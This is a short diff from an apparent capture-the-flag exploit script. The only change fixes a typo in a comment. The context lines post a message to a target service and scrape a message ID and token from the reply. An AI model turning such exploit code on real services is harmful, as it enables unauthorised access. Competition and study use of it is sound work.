@@ -167,7 +167,7 @@ def exploit(target, token, flagids=[]):
     # Create a random message
     resp = sess.post(f"http://[{target}]:3000/create", data={'type': 'text', 'content': randomstring(30), 'pw': pw})
 
-    # Retreive the token
+    # Retrieve the token
     message_id = re.findall("Message with ID (\d+)", resp.text)[0]
     token = re.findall('value="(.*?)"', resp.text)[0]
 
